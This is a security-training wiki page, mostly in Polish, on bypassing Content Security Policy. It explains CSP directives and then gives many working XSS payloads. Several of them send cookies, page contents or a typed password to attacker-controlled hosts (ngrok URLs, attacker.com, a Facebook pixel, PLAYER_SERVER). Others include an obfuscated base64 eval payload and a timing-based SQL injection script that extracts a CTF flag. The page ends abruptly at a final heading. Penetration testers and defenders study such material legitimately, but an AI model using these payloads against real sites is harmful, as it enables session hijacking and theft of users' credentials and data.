# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Czym jest CSP

Content Security Policy (CSP) jest rozpoznawana jako technologia przeglądarki, której głównym celem jest **ochrona przed atakami takimi jak cross-site scripting (XSS)**. Działa poprzez definiowanie i określanie ścieżek oraz źródeł, z których przeglądarka może bezpiecznie ładować zasoby. Do takich zasobów należą elementy takie jak obrazy, ramki oraz JavaScript. Na przykład polityka może zezwalać na ładowanie i wykonywanie zasobów z tej samej domeny (self), w tym zasobów inline oraz wykonywanie kodu z łańcuchów za pomocą funkcji takich jak `eval`, `setTimeout` lub `setInterval`.

Wdrożenie CSP odbywa się przez **nagłówki odpowiedzi** lub przez umieszczenie **meta elementów w stronie HTML**. Przeglądarki egzekwują tę politykę i natychmiast blokują wykryte naruszenia.

- Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Zaimplementowane za pomocą meta tagu:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Nagłówki

CSP można egzekwować lub monitorować za pomocą następujących nagłówków:

- `Content-Security-Policy`: Wymusza CSP; przeglądarka blokuje wszelkie naruszenia.
- `Content-Security-Policy-Report-Only`: Używany do monitorowania; zgłasza naruszenia bez ich blokowania. Idealny do testowania w środowiskach przedprodukcyjnych.

### Definiowanie zasobów

CSP ogranicza źródła ładowania zarówno treści aktywnych, jak i pasywnych, kontrolując takie aspekty jak wykonywanie inline JavaScript i użycie `eval()`. Przykładowa polityka to:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

- **script-src**: Pozwala na określone źródła dla JavaScriptu, w tym URL-e, skrypty inline oraz skrypty wywołane przez obsługiwacze zdarzeń lub arkusze XSLT.
- **default-src**: Ustawia domyślną politykę dla pobierania zasobów, gdy brak jest specyficznych dyrektyw fetch.
- **child-src**: Określa dozwolone zasoby dla web workers i zawartości osadzonych ramek.
- **connect-src**: Ogranicza URL-e, które można ładować przy użyciu interfejsów takich jak fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Ogranicza URL-e dla ramek.
- **frame-ancestors**: Określa, które źródła mogą osadzać bieżącą stronę, ma zastosowanie do elementów takich jak `<frame>`, `<iframe>`, `<object>`, `<embed>`, i `<applet>`.
- **img-src**: Definiuje dozwolone źródła dla obrazów.
- **font-src**: Określa poprawne źródła dla fontów ładowanych przy użyciu `@font-face`.
- **manifest-src**: Definiuje dozwolone źródła plików manifestu aplikacji.
- **media-src**: Definiuje dozwolone źródła dla ładowania obiektów multimedialnych.
- **object-src**: Określa dozwolone źródła dla elementów `<object>`, `<embed>`, i `<applet>`.
- **base-uri**: Określa dozwolone URL-e do ładowania przy użyciu elementów `<base>`.
- **form-action**: Wymienia prawidłowe endpointy dla wysyłania formularzy.
- **plugin-types**: Ogranicza typy mime, które strona może wywołać.
- **upgrade-insecure-requests**: Nakazuje przeglądarkom przepisać URL-e HTTP na HTTPS.
- **sandbox**: Stosuje ograniczenia podobne do atrybutu sandbox elementu `<iframe>`.
- **report-to**: Określa grupę, do której zostanie wysłane zgłoszenie, jeśli polityka zostanie naruszona.
- **worker-src**: Określa poprawne źródła dla skryptów Worker, SharedWorker lub ServiceWorker.
- **prefetch-src**: Określa poprawne źródła dla zasobów, które będą pobierane lub wstępnie pobierane.
- **navigate-to**: Ogranicza URL-e, do których dokument może nawigować dowolnym sposobem (a, form, window.location, window.open, itp.)

### Sources

- `*`: Pozwala na wszystkie URL-e z wyjątkiem schematów `data:`, `blob:`, `filesystem:`.
- `'self'`: Pozwala na ładowanie z tej samej domeny.
- `'data'`: Pozwala na ładowanie zasobów za pomocą schematu data (np. obrazy zakodowane w Base64).
- `'none'`: Blokuje ładowanie z jakiegokolwiek źródła.
- `'unsafe-eval'`: Pozwala na użycie `eval()` i podobnych metod; niezalecane ze względów bezpieczeństwa.
- `'unsafe-hashes'`: Włącza określone wbudowane obsługiwacze zdarzeń.
- `'unsafe-inline'`: Pozwala na użycie zasobów inline, takich jak inline `<script>` lub `<style>`; niezalecane ze względów bezpieczeństwa.
- `'nonce'`: Biała lista dla określonych skryptów inline wykorzystujących kryptograficzny nonce (liczba użyta jednokrotnie).
- Jeśli wykonywanie JS jest ograniczone, możliwe jest pobranie użytego nonce wewnątrz strony przy pomocy `doc.defaultView.top.document.querySelector("[nonce]")` i następnie ponowne jego użycie do załadowania złośliwego skryptu (jeśli używany jest strict-dynamic, dowolne dozwolone źródło może ładować nowe źródła, więc to nie jest potrzebne), na przykład:

<details>

<summary>Załaduj skrypt ponownie wykorzystując nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Zezwala na skrypty o określonym hashu sha256.
- `'strict-dynamic'`: Pozwala ładować skrypty z dowolnego źródła, jeśli zostały dodane do białej listy przez nonce lub hash.
- `'host'`: Określa konkretny host, np. `example.com`.
- `https:`: Ogranicza adresy URL do tych korzystających z HTTPS.
- `blob:`: Pozwala na ładowanie zasobów z Blob URL-i (np. Blob URL-i utworzonych przez JavaScript).
- `filesystem:`: Pozwala na ładowanie zasobów z systemu plików.
- `'report-sample'`: Dołącza próbkę naruszającego kodu do raportu o naruszeniu (przydatne przy debugowaniu).
- `'strict-origin'`: Podobne do 'self', ale wymusza, aby poziom bezpieczeństwa protokołu źródeł odpowiadał dokumentowi (tylko bezpieczne originy mogą ładować zasoby z bezpiecznych originów).
- `'strict-origin-when-cross-origin'`: Wysyła pełne URL-e przy żądaniach same-origin, ale przy żądaniach cross-origin wysyła tylko origin.
- `'unsafe-allow-redirects'`: Pozwala na ładowanie zasobów, które natychmiast przekierowują do innego zasobu. Niezalecane, bo osłabia bezpieczeństwo.

## Niebezpieczne reguły CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Działający payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' przez Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> To nie działa, więcej informacji znajdziesz w [**tym wątku**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Działający payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Jeśli w jakiś sposób sprawisz, że **dozwolony kod JS utworzy w DOM nowy script tag** zawierający twój kod JS — ponieważ tworzy go dozwolony skrypt — to **nowy script tag będzie dozwolony do wykonania**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Działający payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Brak object-src i default-src

> [!CAUTION] > **Wygląda na to, że to już nie działa**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Działające payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Przesyłanie plików + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Jeśli możesz przesłać plik JS możesz obejść ten CSP:

Działający payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
However, it's highly probable that the server is **validating the uploaded file** and will only allow you to **upload determined type of files**.

Moreover, even if you could upload a **JS code inside** a file using an extension accepted by the server (like: _script.png_) this won't be enough because some servers like apache server **select MIME type of the file based on the extension** and browsers like Chrome will **reject to execute Javascript** code inside something that should be an image. "Hopefully", there are mistakes. For example, from a CTF I learnt that **Apache doesn't know** the _**.wave**_ extension, therefore it doesn't serve it with a **MIME type like audio/***.

From here, if you find a XSS and a file upload, and you manage to find a **misinterpreted extension**, you could try to upload a file with that extension and the Content of the script. Or, if the server is checking the correct format of the uploaded file, create a polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

If not possible to inject JS, you could still try to exfiltrate for example credentials **injecting a form action** (and maybe expecting password managers to auto-fill passwords). You can find an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Also, notice that `default-src` does not cover form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Dla niektórych z poniższych payloadów **`unsafe-eval` nie jest nawet potrzebny**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Załaduj podatną wersję angular i wykonaj dowolny kod JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads używające Angular + biblioteki z funkcjami, które zwracają obiekt `window` ([zobacz ten wpis](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Wpis pokazuje, że możesz **załadować** wszystkie **biblioteki** z `cdn.cloudflare.com` (lub z innego dozwolonego repozytorium bibliotek JS), wykonać wszystkie dodane funkcje z każdej biblioteki i sprawdzić **które funkcje z których bibliotek zwracają obiekt `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS z nazwy klasy:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Nadużywanie google recaptcha JS code

Według [**tego writeupu z CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) możesz nadużyć [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) wewnątrz CSP, aby wykonać dowolny kod JS, omijając CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Więcej [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Wykorzystywanie www.google.com do open redirect

Poniższy URL przekierowuje na example.com (from [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Wykorzystywanie \*.google.com/script.google.com

Możliwe jest wykorzystanie Google Apps Script do otrzymywania informacji na stronie wewnątrz script.google.com. Jak opisano to w tym raporcie: [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Endpointy stron trzecich + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Sytuacje takie jak ta, w których `script-src` jest ustawione na `self` i konkretna domena jest umieszczona na białej liście, można obejść za pomocą JSONP. Endpointy JSONP pozwalają na niebezpieczne metody callback, które umożliwiają atakującemu wykonanie XSS, działający payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **zawiera gotowe do użycia JSONP endpoints umożliwiające CSP bypass różnych stron.**

Ta sama podatność wystąpi, jeśli **zaufany endpoint zawiera Open Redirect**, ponieważ jeśli początkowy endpoint jest zaufany, przekierowania również będą zaufane.

### Nadużycia stron trzecich

Jak opisano w [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), istnieje wiele domen stron trzecich, które mogą być dopuszczone w CSP i które można nadużyć do exfiltrate danych lub wykonania kodu JavaScript. Niektóre z tych stron trzecich to:

| Entity            | Allowed Domain                               | Capabilities |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Jeśli znajdziesz którąkolwiek z dozwolonych domen w CSP Twojego targetu, istnieje duża szansa, że będziesz w stanie obejść CSP rejestrując się w serwisie stron trzecich i albo exfiltrate dane do tego serwisu, albo wykonać kod.

For example, if you find the following CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
lub
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
You should be able to exfiltrate data, similarly as it has always be done with [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). In this case, you follow these general steps:

1. Utwórz konto Facebook Developer tutaj.
2. Utwórz nową aplikację "Facebook Login" i wybierz "Website".
3. Przejdź do "Settings -> Basic" i pobierz swój "App ID"
4. Na docelowej stronie, z której chcesz exfiltrate data, możesz to zrobić, używając bezpośrednio Facebook SDK (gadget "fbq") przez "customEvent" i przekazując data payload.
5. Przejdź do swojego App "Event Manager" i wybierz aplikację, którą utworzyłeś (uwaga: event manager można znaleźć pod URL podobnym do tego: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
6. Wybierz zakładkę "Test Events", aby zobaczyć eventy wysyłane przez "twoją" stronę.

Then, on the victim side, you execute the following code to initialize the Facebook tracking pixel to point to the attacker's Facebook developer account app-id and issue a custom event like this:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Jeśli chodzi o pozostałe siedem domen third-party wymienionych w poprzedniej tabeli, istnieje wiele innych sposobów ich nadużycia. Zobacz wcześniej [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) po dodatkowe wyjaśnienia na temat innych nadużyć third-party.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Oprócz wspomnianego przekierowania służącego do obejścia ograniczeń ścieżki, istnieje inna technika nazwana Relative Path Overwrite (RPO), którą można zastosować na niektórych serwerach.

Na przykład, jeśli CSP zezwala na ścieżkę `https://example.com/scripts/react/`, można ją obejść w następujący sposób:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Przeglądarka ostatecznie załaduje `https://example.com/scripts/angular/angular.js`.

Działa to, ponieważ dla przeglądarki ładujesz plik o nazwie `..%2fangular%2fangular.js` znajdujący się pod `https://example.com/scripts/react/`, co jest zgodne z CSP.

Przeglądarka je zdekoduje, skutecznie żądając `https://example.com/scripts/react/../angular/angular.js`, co jest równoważne `https://example.com/scripts/angular/angular.js`.

Poprzez **wykorzystanie tej niespójności w interpretacji URL między przeglądarką a serwerem można obejść reguły dotyczące ścieżek**.

Rozwiązaniem jest, aby nie traktować `%2f` jako `/` po stronie serwera, zapewniając spójną interpretację między przeglądarką a serwerem, aby uniknąć tego problemu.

Przykład online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Wykonywanie JS w iframe'ach


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### brak **base-uri**

Jeśli dyrektywa **base-uri** jest nieobecna, możesz to wykorzystać do przeprowadzenia [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Ponadto, jeśli **strona ładuje skrypt używając ścieżki względnej** (jak `<script src="/js/app.js">`) z użyciem **Nonce**, możesz nadużyć **base** **tag**, aby **załadować** skrypt z **twojego własnego serwera, osiągając XSS.**\
Jeśli podatna strona jest ładowana przez **httpS**, użyj httpS url w tagu base.
```html
<base href="https://www.attacker.com/" />
```
### Zdarzenia AngularJS

Pewna polityka, znana jako Content Security Policy (CSP), może ograniczać zdarzenia JavaScript. Jednak AngularJS wprowadza własne zdarzenia jako alternatywę. W ramach zdarzenia AngularJS udostępnia unikalny obiekt `$event`, odwołujący się do natywnego obiektu zdarzenia przeglądarki. Ten obiekt `$event` można wykorzystać do obejścia CSP. W szczególności w Chrome obiekt `$event/event` posiada atrybut `path`, zawierający tablicę obiektów zaangażowanych w łańcuch wykonywania zdarzenia, przy czym obiekt `window` znajduje się zawsze na końcu. Ta struktura jest kluczowa dla sandbox escape tactics.

Przekierowując tę tablicę do filtra `orderBy`, można po niej iterować i wykorzystać element końcowy (obiekt `window`), żeby wywołać globalną funkcję taką jak `alert()`. Poniższy fragment kodu ilustruje ten proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ten fragment podkreśla użycie dyrektywy `ng-focus` do wywołania zdarzenia, wykorzystując `$event.path|orderBy` do manipulacji tablicą `path` oraz używając obiektu `window` do wykonania funkcji `alert()`, ujawniając w ten sposób `document.cookie`.

**Znajdź inne Angular bypasses na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Polityka CSP, która dopuszcza określone domeny do ładowania skryptów w aplikacji Angular JS, może zostać ominięta poprzez wywołanie funkcji callback oraz wykorzystanie niektórych podatnych klas. Dalsze informacje na temat tej techniki można znaleźć w szczegółowym przewodniku dostępnym w tym [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Działające payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Inne JSONP arbitrary execution endpoints można znaleźć w [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (niektóre z nich zostały usunięte lub naprawione)

### Obejście przez przekierowanie

Co się dzieje, gdy CSP napotyka przekierowanie po stronie serwera? Jeśli przekierowanie prowadzi do innego originu, który nie jest dozwolony, to i tak się nie powiedzie.

Jednak zgodnie z opisem w [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), jeśli przekierowanie prowadzi do innej ścieżki, może ono ominąć pierwotne ograniczenia.

Oto przykład:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Jeżeli CSP jest ustawione na `https://www.google.com/a/b/c/d`, ponieważ uwzględniana jest ścieżka, zarówno skrypty z `/test`, jak i z `/a/test` zostaną zablokowane przez CSP.

Jednak końcowy `http://localhost:5555/301` zostanie **przekierowany po stronie serwera do `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Ponieważ jest to przekierowanie, **ścieżka nie jest brana pod uwagę**, a **skrypt może zostać załadowany**, omijając ograniczenie ścieżki.

Dzięki temu przekierowaniu, nawet jeśli ścieżka jest określona w całości, nadal można ją obejść.

Najlepszym rozwiązaniem jest więc upewnić się, że strona nie ma żadnych podatności typu open redirect oraz że w regułach CSP nie występują domeny, które można wykorzystać.

### Bypass CSP with dangling markup

Przeczytaj [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` oznacza, że możesz uruchomić dowolny skrypt w kodzie (XSS może wykonać kod), a `img-src *` oznacza, że możesz użyć na stronie dowolnego obrazu z dowolnego źródła.

Możesz obejść ten CSP, eksfiltrując dane za pomocą obrazów (w tym przypadku XSS wykorzystuje CSRF, gdzie strona dostępna dla bota zawiera SQLi i wyciąga flagę przez obraz):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Możesz także wykorzystać tę konfigurację do **załadowania kodu javascript umieszczonego wewnątrz obrazu**. Jeśli na przykład strona pozwala na ładowanie obrazów z Twittera, możesz **stworzyć** **specjalny obraz**, **uploadować** go na Twittera i wykorzystać "**unsafe-inline**" do **wykonania** kodu JS (jak zwykły XSS), który **załaduje** obraz, **wyodrębni** z niego **JS** i **wykona** **go**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Z Service Workers

Funkcja `importScripts` w Service workers nie jest ograniczona przez CSP:

{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Badania:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Jeśli wysyłany przez Ciebie **parametr** jest **wklejany wewnątrz** **deklaracji** **polityki**, możesz w pewien sposób **zmienić** **politykę**, czyniąc ją **bezużyteczną**. Możesz **zezwolić skryptom 'unsafe-inline'** za pomocą jednego z następujących obejść:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Ponieważ ta dyrektywa **nadpisze istniejące dyrektywy script-src**.\
Przykład znajdziesz tutaj: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

W Edge jest to dużo prostsze. Jeśli możesz dodać do CSP tylko to: **`;_`** **Edge** usunie całą **politykę**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Zauważ brak dyrektywy `'unsafe-inline'`\
Tym razem możesz sprawić, że ofiara **załaduje** stronę pod **twoją kontrolą** przez **XSS** za pomocą `<iframe`. Tym razem sprawisz, że ofiara uzyska dostęp do strony, z której chcesz wyodrębnić informacje (**CSRF**). Nie możesz uzyskać dostępu do treści strony, ale jeśli w jakiś sposób potrafisz **kontrolować czas ładowania strony**, możesz wyodrębnić potrzebne informacje.

Tym razem zostanie wyekstrahowany **flag** — za każdym razem, gdy **char zostanie poprawnie odgadnięty** przez SQLi, **response** zajmuje **więcej czasu** z powodu funkcji sleep. Wtedy będziesz w stanie wyodrębnić flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Przez Bookmarklets

Ten atak zakłada pewien social engineering, w którym atakujący **przekonuje użytkownika do przeciągnięcia i upuszczenia linku na bookmarklet przeglądarki**. Ten bookmarklet zawierałby **złośliwy kod javascript**, który po przeciągnięciu i upuszczeniu lub kliknięciu zostanie wykonany w kontekście bieżącego okna przeglądarki, **omijając CSP i umożliwiając kradzież wrażliwych informacji** takich jak cookies lub tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

